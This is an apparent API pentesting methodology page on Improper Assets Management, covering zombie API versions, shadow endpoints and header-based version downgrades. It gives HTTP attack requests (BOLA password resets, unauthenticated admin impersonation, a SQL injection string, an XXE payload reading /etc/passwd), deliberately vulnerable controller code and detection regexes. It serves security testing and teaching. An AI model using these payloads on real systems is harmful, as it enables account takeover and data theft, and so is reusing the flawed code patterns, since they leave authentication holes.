# Improper Assets Management

## Check List

## Methodology

### Black Box

#### Deprecated API Version Exposed

{% stepper %}
{% step %}
Login normally and Capture request to current API version

```http
GET /api/v2/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
Attempt to access older API versions

```http
GET /api/v1/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```

or

```http
GET /api/v0/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
If deprecated version responds successfully and lacks recent security controls, old API is still active
{% endstep %}

{% step %}
If older endpoint exposes additional fields or bypasses new authorization logic, improper asset management is confirmed
{% endstep %}
{% endstepper %}

***

#### Staging or Test API Exposed

{% stepper %}
{% step %}
Enumerate subdomains

```http
GET / HTTP/1.1
Host: api-staging.target.com
```

or

```http
GET / HTTP/1.1
Host: dev-api.target.com
```
{% endstep %}

{% step %}
If staging or development API responds publicly, environment isolation is missing
{% endstep %}

{% step %}
Test authentication endpoint

```http
POST /api/login HTTP/1.1
Host: api-staging.target.com
Content-Type: application/json

{"username":"test","password":"test"}
```
{% endstep %}

{% step %}
If weaker authentication or test credentials work on exposed environment, improper asset control exists
{% endstep %}

{% step %}
If non-production APIs are accessible externally, vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Forgotten Internal Endpoint

{% stepper %}
{% step %}
Login as normal user and Browse JavaScript files

```http
GET /static/app.js HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Identify undocumented endpoint reference

```http
/api/internal/exportAllUsers
```
{% endstep %}

{% step %}
Directly access endpoint

```http
GET /api/internal/exportAllUsers HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
If endpoint responds with sensitive data despite not being part of public API documentation, internal API is exposed
{% endstep %}

{% step %}
If forgotten or hidden API endpoints are accessible without restriction, improper asset management is confirmed
{% endstep %}
{% endstepper %}

***

#### Unused GraphQL Endpoint Enabled

{% stepper %}
{% step %}
Attempt access to GraphQL endpoint

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query":"{__schema{types{name}}}"}
```
{% endstep %}

{% step %}
If schema introspection is enabled and returns full API structure, hidden asset is exposed
{% endstep %}

{% step %}
Test unauthorized query

```json
{"query":"{users{id,email,password}}"}
```
{% endstep %}

{% step %}
If sensitive data fields are retrievable via undocumented GraphQL endpoint, asset governance is missing
{% endstep %}

{% step %}
If legacy or unused API services remain active and accessible, Improper Assets Management vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Zombie API Resuscitation via Route Versioning Downgrade (MFA/BOLA Bypass)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern API ecosystems utilizing explicit URI versioning (e.g., `/api/v3/users`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway routing tables or backend controller initialization logic
{% endstep %}

{% step %}
Identify the "Phased Deprecation" architecture. Enterprises rarely shut down legacy API versions (`v1`, `v2`) immediately upon releasing `v3`. They keep older versions alive to support outdated mobile applications, B2B partners who haven't migrated, or legacy IoT devices
{% endstep %}

{% step %}
Investigate the Database Context. Crucially, while the API controllers for `v1` and `v3` are physically separate codeblocks, they typically interact with the exact same underlying, live production database
{% endstep %}

{% step %}
Analyze the Security Delta. Over three years, the enterprise massively upgraded its security posture. For `v3`, they implemented strict Broken Object Level Authorization (BOLA) checks and mandated Multi-Factor Authentication (MFA) tokens
{% endstep %}

{% step %}
Discover the fatal Asset Management failure: The `v1` controllers were authored before BOLA or MFA were standard corporate policy. Because `v1` is considered "deprecated but active" (a Zombie API), security engineers focus exclusively on pentesting and hardening `v3`. The `v1` code remains untouched and unpatched
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker can simply mutate the URL path from `/api/v3/` back to `/api/v1/`, they physically transport their HTTP request back in time to an older, highly vulnerable execution pipeline that completely ignores modern security policies while still manipulating live production data
{% endstep %}

{% step %}
Formulate the Zombie API payload. Identify a highly secure endpoint in the modern API (e.g., `PUT /api/v3/users/me/password`). This endpoint requires a complex MFA token and a previous password check
{% endstep %}

{% step %}
Systematically test legacy route variants (e.g., `/api/v1/users/991/password`, `/api/v2/users/password`)
{% endstep %}

{% step %}
Observe the legacy API contract. Older APIs often lacked the `/me` context, requiring direct IDs, making them inherently vulnerable to BOLA
{% endstep %}

{% step %}
Construct the downgrade payload: `PUT /api/v1/users/991/password` with `{"new_password": "Hacked123!"}`&#x20;
{% endstep %}

{% step %}
Transmit the payload using a basic, non-MFA session token
{% endstep %}

{% step %}
The API Gateway routes the request to the forgotten `v1` controller
{% endstep %}

{% step %}
The `v1` controller lacks MFA checks. It lacks BOLA checks to ensure you own User 991. It executes the password reset directly against the shared production database. The attacker achieves complete Account Takeover by resurrecting a Zombie API to bypass the enterprise's entire modern security apparatus

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\[ApiVersion\(['"]1\.0['"]\)\])
```
{% endtab %}

{% tab title="Java" %}
```regexp
(@RequestMapping\(['"]/api/v1['"]\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(Route::prefix\(['"]v1['"]\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(app\.use\(['"]/api/v1['"],\s*v1Router\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"\[ApiVersion\(['\"]1\.0['\"]\)\]"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"@RequestMapping\(['\"]/api/v1['\"]\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"Route::prefix\(['\"]v1['\"]\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"app\.use\(['\"]/api/v1['\"],\s*v1Router\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// Modern Controller
[ApiVersion("3.0")]
[Route("api/v{version:apiVersion}/users")]
[Authorize(Policy = "MfaCompleted")]
public class UsersV3Controller : ControllerBase { /* Secure Logic */ }

// [1]
// [2]
// [3]
// [4]
// The Zombie Controller. Marked as deprecated but physically active.
// Missing the modern authorization policies.
[ApiVersion("1.0", Deprecated = true)]
[Route("api/v{version:apiVersion}/users")]
public class UsersV1Controller : ControllerBase
{
    [HttpPost("{id}/reset-password")]
    public async Task<IActionResult> ResetPassword(int id, [FromBody] ResetDto req)
    {
        // Executes without verifying if the caller owns the 'id'
        await _userService.ForcePasswordResetAsync(id, req.NewPassword);
        return Ok();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
// Modern Secure Implementation
@RestController
@RequestMapping("/api/v3/users")
public class UserV3Controller { /* Secure */ }

// [1]
// [2]
// [3]
// [4]
// Legacy Controller left in the codebase.
@RestController
@RequestMapping("/api/v1/users")
public class UserV1Controller {

    @Autowired
    private UserRepository userRepository;

    @PutMapping("/{id}/email")
    public ResponseEntity<?> updateEmail(@PathVariable Long id, @RequestBody String newEmail) {
        // No @PreAuthorize check. Updates the live database directly.
        User user = userRepository.findById(id).orElseThrow();
        user.setEmail(newEmail);
        userRepository.save(user);
        return ResponseEntity.ok().build();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// routes/api.php

// Modern Secure Routes
Route::prefix('v3')->middleware(['auth:sanctum', 'mfa.verify'])->group(function () {
    Route::put('/users/me/password', [UserV3Controller::class, 'updatePassword']);
});

// [1]
// [2]
// [3]
// [4]
// Zombie Routes. Kept alive because "some clients might still use it".
Route::prefix('v1')->middleware(['auth:sanctum'])->group(function () {
    Route::put('/users/{id}/password', [UserV1Controller::class, 'updatePassword']); // Vulnerable to BOLA
});
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const express = require('express');
const app = express();

const v3Router = require('./routes/v3/users');
const v1Router = require('./routes/v1/users'); // Zombie API module

// Modern API with strict MFA and BOLA enforcement
app.use('/api/v3/users', requireMfa, v3Router);

// [1]
// [2]
// [3]
// [4]
// Fatal Flaw: The v1 router is still mounted to support legacy mobile apps.
// It lacks the 'requireMfa' middleware and points to controllers written 3 years ago 
// that query the database by raw ID without checking ownership.
app.use('/api/v1/users', v1Router);
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture undergoes continuous iteration, replacing older API contracts with modern, secure RESTful endpoints, \[2] To prevent breaking changes for existing integrations, deployment pipelines actively host multiple historical iterations of the API concurrently, \[3] Both the legacy APIs and modern APIs interact with the exact same production data stores, \[4] The execution sink. Improper Assets Management dictates a failure to decommission outdated operational logic. Developers assumed that hiding `v1` from the official Swagger documentation effectively retired the asset. Because the `v1` codebase was frozen, it never received the enterprise-wide security patches (like mandatory MFA or generic BOLA filters) applied to `v3`. The attacker bypasses the heavily fortified `v3` perimeter entirely by explicitly downgrading their URI path. The API Gateway routes the attacker into the legacy controller pipeline. This dormant, unpatched codebase processes the attacker's payload and manipulates the modern production database, converting an organizational retention policy into a devastating time-machine exploit

```http
// 1. Attacker attempts to hijack a high-value account using the modern API.
PUT /api/v3/users/me/password HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"new_password": "Hacked123!", "mfa_code": "000000"}

// 2. The API rejects the request because the MFA code is invalid.
// HTTP/1.1 403 Forbidden - "MFA Required"

// 3. Attacker runs a directory brute-forcer or analyzes historical API specs.
// 4. Attacker discovers the active v1 route and structures a BOLA payload targeting User 88 (Admin).

PUT /api/v1/users/88/password HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"new_password": "Hacked123!"}

// 5. The API Gateway maps /api/v1/ to the legacy Zombie controller.
// 6. The Zombie controller executes, bypassing MFA and BOLA.
// 7. The admin's password is successfully overwritten in the shared production database.
```
{% endstep %}

{% step %}
To ensure backward compatibility across highly fragmented client ecosystems, infrastructure architects simultaneously hosted multiple chronological iterations of their API services. This architectural necessity fundamentally conflicted with modern security patching lifecycles. Security teams focused their hardening and auditing efforts exclusively on the bleeding-edge `v3` codebase, allowing the `v1` and `v2` repositories to stagnate. This systemic failure to decommission or secure legacy assets resulted in Zombie APIs. The attacker exploited this temporal asymmetry by shifting their operational trajectory from the fortified modern endpoint to the forgotten legacy endpoint. Because the legacy codebase remained wired to the live production database, it acted as an unsecured backdoor. The attacker effortlessly bypassed modern MFA and authorization barriers, utilizing the enterprise's own deprecated codebase to execute unauthorized, high-impact mutations against live production environments
{% endstep %}
{% endstepper %}

***

#### Shadow API Exploitation via Undocumented Migration/Sync Endpoints

{% stepper %}
{% step %}
Map the entire target system using Burp Suite, JavaScript Source Map reconstruction, and aggressive endpoint fuzzing (using wordlists tailored to development terminology like `sync`, `migrate`, `mock`, `impersonate`, `admin`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend routing structure, paying special attention to administrative or internal route groups
{% endstep %}

{% step %}
Identify the "Shadow Asset" architecture. Over the lifespan of a large application, developers write temporary, highly privileged utility endpoints to solve immediate engineering problems. For example, during a database migration from PostgreSQL to Snowflake, a developer creates an endpoint `/api/internal/sync-users` to manually trigger data transfers
{% endstep %}

{% step %}
Investigate the routing hygiene. These utility endpoints are never documented in Postman/Swagger, are not subject to standard QA testing, and are explicitly hidden from the user interface
{% endstep %}

{% step %}
Analyze the Authentication void. Because these endpoints were intended to be triggered locally by developers or via isolated internal cron jobs, developers often intentionally bypass standard JWT authentication to make the scripts easier to run via raw `cURL`
{% endstep %}

{% step %}
Discover the fatal exposure: The temporary utility endpoints are merged into the `master` branch. The deployment pipeline pushes them to the public production API Gateway. The developer forgets to remove the code or place it behind an internal-only firewall rule
{% endstep %}

{% step %}
Understand the vulnerability: The enterprise is now hosting a Shadow API—a highly destructive, unauthenticated endpoint operating in production without the knowledge of the security or operations teams
{% endstep %}

{% step %}
Formulate the Shadow API payload. You must discover the hidden endpoint and deduce its required JSON payload structure (often found by analyzing Git history if open-source, or reverse-engineering leaked frontend developer bundles)
{% endstep %}

{% step %}
Identify the target endpoint: `POST /api/internal/admin/impersonate`
{% endstep %}

{% step %}
Construct the payload based on the deduced schema: `{"target_email": "ceo@enterprise.tld"}`
{% endstep %}

{% step %}
Transmit the payload to the API without any authentication headers
{% endstep %}

{% step %}
The API Gateway, lacking any explicit denial rules for the `/internal` path, routes the request to the application&#x20;
{% endstep %}

{% step %}
The backend controller (the Shadow API) executes. Because it was written as a developer shortcut, it bypasses standard login flows, generates a valid administrative JWT for the CEO's account, and returns it in the HTTP response. You achieve immediate Account Takeover through a forgotten developer backdoor

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\[Route\(['"]api/internal/.*['"]\)\])
```
{% endtab %}

{% tab title="Java" %}
```regexp
(@RequestMapping\(['"]/(dev|admin)/.*['"]\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(Route::(post|get)\(['"]/webhooks/legacy.*['"]\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(router\.post\(['"]/(internal|dev|sync|migrate|impersonate)['"])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"\[Route\(['\"]api/internal/.*['\"]\)\]"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"@RequestMapping\(['\"]/(dev|admin)/.*['\"]\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"Route::(post|get)\(['\"]/webhooks/legacy.*['\"]\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"router\.post\(['\"]/(internal|dev|sync|migrate|impersonate)['\"]"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// [1]
// [2]
// [3]
// [4]
// Shadow API Controller: Missing the [Authorize] attribute.
// Created to sync data during an AWS migration. Left active in production.
[Route("api/internal/sync")]
[ApiController]
public class DataSyncController : ControllerBase
{
    [HttpPost("trigger-database-drop")]
    public async Task<IActionResult> DropAndSync()
    {
        // Executes catastrophic database operations unauthenticated
        await _migrationService.DropPrimaryTablesAsync();
        await _migrationService.SyncFromS3Async();
        return Ok("Sync complete");
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
@RequestMapping("/api/admin/utils")
public class DevToolsController {

    @Autowired
    private SystemService systemService;

    // [1]
    // [2]
    // [3]
    // [4]
    // Shadow API: Built to upload raw config files during deployment.
    // The developer assumed /api/admin/* was blocked by the gateway, 
    // but the gateway only blocks /admin/*
    @PostMapping("/upload-config")
    public ResponseEntity<?> uploadConfig(@RequestBody String xmlPayload) {
        // Processes untrusted XML, leading to potential XXE or RCE 
        // without requiring a valid administrator session.
        systemService.applyRawConfiguration(xmlPayload);
        return ResponseEntity.ok().build();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// routes/api.php

// [1]
// [2]
// [3]
// [4]
// Shadow API: A webhook written to catch callbacks from a defunct third-party service.
// The service is dead, but the route remains active and unprotected.
Route::post('/webhooks/legacy-payment-sync', function (Request $request) {
    // Blindly trusts the payload because it "came from the payment gateway"
    $user = User::find($request->input('user_id'));
    $user->balance += $request->input('amount');
    $user->save();

    return response()->json(['success' => true]);
});
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const express = require('express');
const router = express.Router();

// Standard secure routes...
router.use('/users', requireAuth, usersRouter);

// [1]
// [2]
// [3]
// [4]
// Shadow API: A developer wrote this 2 years ago to help QA test different 
// user roles without needing passwords. It was never removed.
// It lacks 'requireAuth' because QA automated it using raw curl scripts.
router.post('/api/internal/dev/impersonate', async (req, res) => {
    // Only hidden by obscurity. If discovered, it yields total compromise.
    const user = await User.findOne({ email: req.body.email });
    if (!user) return res.status(404).send();

    const overrideToken = generateAdminJwt(user);
    res.json({ token: overrideToken });
});

module.exports = router;
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture evolves rapidly, often requiring engineers to deploy custom, single-use scripts or endpoints to manage data migrations, third-party integrations, or QA testing, \[2] To bypass the friction of complex OAuth or MFA flows during internal automation tasks, these utility endpoints are frequently authored without standard authentication middleware, \[3] The architecture relies on "Security by Obscurity." Because the endpoints are undocumented in OpenAPI/Swagger and disconnected from the UI, developers assume they are invisible to external threats, \[4] The execution sink. Improper Assets Management occurs when an organization loses topological visibility over its own codebase. The deployment of un-audited, undocumented endpoints into public-facing production environments creates Shadow APIs. These dormant operational backdoors possess immense administrative capabilities but zero perimeter defense. The attacker executes an aggressive reconnaissance campaign using targeted dictionary fuzzing or source-code analysis to map these hidden routes. Upon discovery, the attacker simply transmits the expected payload. The backend, executing its forgotten logic, processes the request unauthenticated, resulting in catastrophic database manipulation, financial fraud, or complete account hijacking via a developer-sanctioned backdoor

```http
// 1. Attacker conducts reconnaissance. They extract a Webpack .js map file 
//    from the frontend and discover a commented-out dev-tools panel referencing 
//    the endpoint `/api/internal/dev/impersonate`.

// 2. Attacker crafts the HTTP request targeting the Shadow API.
// 3. No Authorization header is provided.

POST /api/internal/dev/impersonate HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

{
  "email": "superadmin@enterprise.tld"
}

// 4. The API Gateway routes the request because there are no WAF rules explicitly 
//    blocking `/api/internal/` (a common infrastructure oversight).
// 5. The Node.js Express backend receives the request. The developer's debug code executes.
// 6. The backend queries the admin user, generates a fresh JWT, and returns it.

HTTP/1.1 200 OK
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIsIn...[VALID_SUPERADMIN_JWT]..."
}

// 7. The attacker injects the token into their browser and assumes complete 
//    administrative control of the enterprise platform.
```
{% endstep %}

{% step %}
To facilitate complex engineering migrations and rapid QA automation, backend developers routinely authored highly privileged, undocumented API endpoints. This architectural practice traded secure engineering principles for immediate operational convenience. The systemic security failure was rooted in a profound loss of asset inventory. Because these utility routes bypassed standard API documentation protocols, they became permanently invisible to security auditing and automated testing pipelines. They lingered in the codebase as Shadow APIs, eventually merging into the live production cluster. The attacker leveraged advanced application mapping techniques to illuminate these dark topological regions. Upon identifying a forgotten developer backdoor, the attacker exploited the total absence of authentication middleware. The application obediently executed the requested administrative logic, granting the attacker frictionless, god-level access and entirely circumventing the platform's multi-million-dollar perimeter defense matrix
{% endstep %}
{% endstepper %}

***

#### Invisible Zombie APIs via Content Negotiation (MIME-Type Downgrade)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on mature enterprise APIs that strictly adhere to RESTful principles, explicitly avoiding URL-based versioning (e.g., `/v1/`, `/v2/`) in favor of Header-Based Content Negotiation
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway routing or backend framework's MIME-type resolution logic (e.g., Spring's `produces/consumes`, ASP.NET's `[Consumes]`)
{% endstep %}

{% step %}
Identify the "Content Negotiation Versioning" architecture. Instead of polluting the URI, the API serves all requests at a single static endpoint: `POST /api/payments`. To determine _which_ version of the logic to execute, the backend inspects the `Accept` or `Content-Type` HTTP headers
{% endstep %}

{% step %}
Investigate the Routing matrix. The modern, secure controller is mapped to `Accept: application/vnd.enterprise.v3+json`. The legacy controller is mapped to `Accept: application/vnd.enterprise.v1+json`
{% endstep %}

{% step %}
Analyze the Security Configuration. The security team utilizes automated Dynamic Application Security Testing (DAST) scanners. Because the scanners use standard HTTP headers (`Accept: application/json`), the backend defaults to routing them to the modern `v3` controller. The `v3` controller successfully blocks all injection and BOLA payloads. The security team certifies the endpoint as secure
{% endstep %}

{% step %}
Discover the fatal architectural obfuscation: The legacy `v1` controller—which relies on deprecated, vulnerable XML parsing (XXE) or lacks authorization checks—is completely invisible to standard URL brute-forcing and automated scanners because the URI (`/api/payments`) never changes. It is a functionally Invisible Zombie API
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker meticulously manipulates the HTTP headers to request the deprecated MIME type, the framework's internal routing engine intercepts the request and silently reroutes the execution flow away from the secure modern controller, plunging it directly into the highly vulnerable legacy controller
{% endstep %}

{% step %}
Formulate the MIME-Type Downgrade payload. Identify the static endpoint (e.g., `POST /api/users/profile`)
{% endstep %}

{% step %}
Review historical documentation, intercept old mobile application traffic, or fuzz the `Accept` and `Content-Type` headers using common vendor MIME schemas (e.g., `application/vnd.[company].[version]+json`)
{% endstep %}

{% step %}
Construct the downgrade payload. Send the hostile request (e.g., an unauthorized modification or an XXE payload) to the static endpoint, but explicitly declare the legacy version in the headers: `Content-Type: application/vnd.enterprise.v1+xml`&#x20;
{% endstep %}

{% step %}
The API Gateway forwards the request
{% endstep %}

{% step %}
The backend framework (e.g., Spring Boot) evaluates the headers. It bypasses the secure `v3` controller and matches the `v1` controller signature
{% endstep %}

{% step %}
The `v1` controller executes. Lacking modern validation, it processes the attacker's payload (e.g., parsing the malicious XML), culminating in Remote Code Execution or Authorization Bypass through an invisible, header-driven Zombie API

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\[Consumes\(['"]application/vnd\.[a-zA-Z0-9.-]+\.v1\+(json|xml)['"]\)])
```
{% endtab %}

{% tab title="Java" %}
```regexp
(produces\s*=\s*['"]application/vnd\.[a-zA-Z0-9.-]+\.v1\+(json|xml)['"])
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(if\s*\(\$request->header\(['"]Accept['"]\)\s*==\s*['"]application/vnd)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(if\s*\(\s*req\.headers\.accept\.includes\(['"]v1['"]\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"\[Consumes\(['\"]application/vnd\.[a-zA-Z0-9.-]+\.v1\+(json|xml)['\"]\)]"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"produces\s*=\s*['\"]application/vnd\.[a-zA-Z0-9.-]+\.v1\+(json|xml)['\"]"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"if\s*\(\\$request->header\(['\"]Accept['\"]\)\s*==\s*['\"]application/vnd"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"if\s*\(\s*req\.headers\.accept\.includes\(['\"]v1['\"]\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[ApiController]
[Route("api/users/profile")]
public class UserProfileController : ControllerBase
{
    // Secure v3 logic
    [HttpPut]
    [Consumes("application/vnd.enterprise.v3+json", "application/json")]
    public async Task<IActionResult> UpdateV3([FromBody] ProfileDto req) { /* ... */ }

    // [1]
    // [2]
    // [3]
    // [4]
    // Zombie controller left active to support a deprecated B2B SOAP integration.
    // Lacks modern authorization policies.
    [HttpPut]
    [Consumes("application/vnd.enterprise.v1+xml")]
    public async Task<IActionResult> UpdateV1([FromBody] XmlDocument req)
    {
        // Executes unhardened XML logic
        await _legacyService.UpdateAsync(req);
        return Ok();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
@RequestMapping("/api/users/profile")
public class UserProfileController {

    // Modern Secure Endpoint (Default fallback for standard JSON)
    @PutMapping(consumes = { "application/vnd.enterprise.v3+json", "application/json" })
    public ResponseEntity<?> updateProfileV3(@RequestBody ProfileDtoV3 req, Principal p) {
        // Enforces strict validation and authorization
        return ResponseEntity.ok().build();
    }

    // [1]
    // [2]
    // [3]
    // [4]
    // Invisible Zombie API: Routed via Content Negotiation.
    // Standard URL fuzzing will NEVER find this. It requires the exact header match.
    // This legacy endpoint processes vulnerable XML, leading to XXE.
    @PutMapping(consumes = "application/vnd.enterprise.v1+xml")
    public ResponseEntity<?> updateProfileV1(@RequestBody String rawXml) {
        // Vulnerable legacy XML parser processes the payload
        legacyXmlProcessor.parseAndSave(rawXml); 
        return ResponseEntity.ok().build();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ProfileController extends Controller
{
    public function update(Request $request)
    {
        // [1]
        // [2]
        // [3]
        // [4]
        // Content negotiation hides the deprecated operational branch 
        // from standard URI mapping analysis.
        if ($request->header('Content-Type') === 'application/vnd.enterprise.v1+xml') {
            // Executes vulnerable, deprecated XML business logic
            return $this->processLegacyXml($request->getContent());
        }

        // Secure JSON processing
        $validated = $request->validate([...]);
        return response()->json(['status' => 'secure']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.put('/api/users/profile', async (req, res) => {
    const acceptHeader = req.headers['accept'] || '';

    // [1]
    // [2]
    // [3]
    // [4]
    // Shadow routing hidden deep within the controller logic.
    if (acceptHeader.includes('application/vnd.enterprise.v1+json')) {
        // Zombie API Execution Sink. Bypasses modern validation schemas.
        return legacyV1Update(req, res);
    }

    // Modern Secure Execution
    return modernV3Update(req, res);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture adheres to rigorous RESTful purity, utilizing HTTP Content Negotiation (MIME types) rather than URL path mutations to manage API versioning, \[2] To support legacy clients, the backend framework is configured to route traffic to distinctly different controller logic blocks based entirely on the `Content-Type` or `Accept` headers provided in the request, \[3] The architecture achieves false security certification. Because automated scanners and standard manual pentesting rely on default HTTP headers (`application/json`), they invariably hit the heavily fortified modern controllers, erroneously validating the endpoint as secure, \[4] The execution sink. Improper Assets Management manifests as a failure to deprecate historical routing matrices. By hiding the legacy API versions within header-driven routing layers, developers created Invisible Zombie APIs. These endpoints evade standard reconnaissance while maintaining direct access to live production data. The attacker bypasses the secure modern controller by explicitly forging the legacy vendor MIME type. The backend framework's native routing engine intercepts the header, silently shifting the execution thread into the dormant, unpatched `v1` controller. The application subsequently parses the attacker's payload utilizing obsolete, highly vulnerable parsers (e.g., triggering XXE or SQLi), resulting in systemic compromise via an invisible architectural backdoor

```http
// 1. Attacker targets the unified profile update endpoint.
// 2. Attacker sends a standard JSON payload containing SQLi.

PUT /api/users/profile HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"bio": "Attacker'; DROP TABLE users; --"}

// 3. The API routes the request to the modern V3 controller.
// 4. The V3 controller uses an ORM, parameterizes the input, and returns 200 OK. No injection.

// 5. Attacker investigates old SDKs or fuzzes Content-Type headers.
// 6. Attacker crafts a request targeting the invisible V1 XML controller, 
//    injecting a catastrophic XXE payload.

PUT /api/users/profile HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/vnd.enterprise.v1+xml
Authorization: Bearer <attacker_token>

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Profile>
    <bio>&xxe;</bio>
</Profile>

// 7. The Spring/ASP.NET internal router detects 'application/vnd.enterprise.v1+xml'.
// 8. The router bypasses the secure V3 controller and dispatches the payload to the V1 controller.
// 9. The V1 controller executes its unhardened XML parser.
// 10. The parser executes the XXE, reads the local file, and saves it as the attacker's bio.
// 11. The attacker fetches their profile to read the exfiltrated server data.
```
{% endstep %}

{% step %}
To conform to strict RESTful standards and avoid URL pollution, enterprise architects implemented Content Negotiation to route multiple API versions through a singular, static URI. This architectural paradigm tightly coupled routing telemetry to volatile HTTP headers. The security posture failed due to topological obfuscation. Security engineers, relying on standard operational traffic patterns, exclusively audited the modern JSON controllers, remaining entirely unaware of the legacy XML execution branches persisting beneath the surface. This failure to inventory and decommission header-bound logic generated Invisible Zombie APIs. The attacker exploited this by manually crafting obsolete vendor MIME types. The backend routing engine, honoring the explicit content negotiation request, seamlessly diverted the attacker's payload away from the secure modern perimeter and directly into the unpatched legacy execution sink. The legacy logic processed the payload using deprecated, un-sandboxed parsers, converting a hidden routing artifact into a devastating remote file inclusion and system compromise vector
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
